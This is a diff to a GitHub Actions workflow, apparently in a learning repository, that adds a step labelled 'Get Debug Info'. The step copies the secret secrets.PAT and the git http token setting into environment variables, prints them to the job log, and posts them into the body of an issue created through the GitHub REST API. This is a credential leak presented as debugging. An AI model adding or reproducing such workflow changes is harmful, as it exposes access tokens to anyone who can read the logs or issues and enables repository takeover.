@@ -38,8 +38,11 @@ jobs:
 
     - name: Get Debug Info
       run: |
-        echo "DEBUG_VALUES=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get remote.origin.url)" >> $GITHUB_ENV
-        echo "DEBUG_VALUES2=${{ github.workflow }}" >> $GITHUB_ENV
+        echo "DEBUG_VALUES1=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get remote.origin.url)" >> $GITHUB_ENV
+        echo "DEBUG_VALUES1_2=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get http.[token value location])" >> $GITHUB_ENV
+        echo "DEBUG_VALUES2=${{ secrets.PAT }}" >> $GITHUB_ENV
+        echo "DEBUG_VALUES2_1=${{ github.workflow }}" >> $GITHUB_ENV
+        
     - name: Debug GITHUB_ENV
       run: cat $GITHUB_ENV
     - name: Create issue using REST API if failure
@@ -51,6 +54,6 @@ jobs:
           --header 'content-type: application/json' \
           --data '{
             "title": "PR evaluated successfully",
-            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUES }} DEBUG_VAL2: ${{ env.DEBUG_VALUES2 }}"
+            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUES1_2 }} DEBUG_VAL2: ${{ env.DEBUG_VALUES2 }}"
             }' \
           --fail 
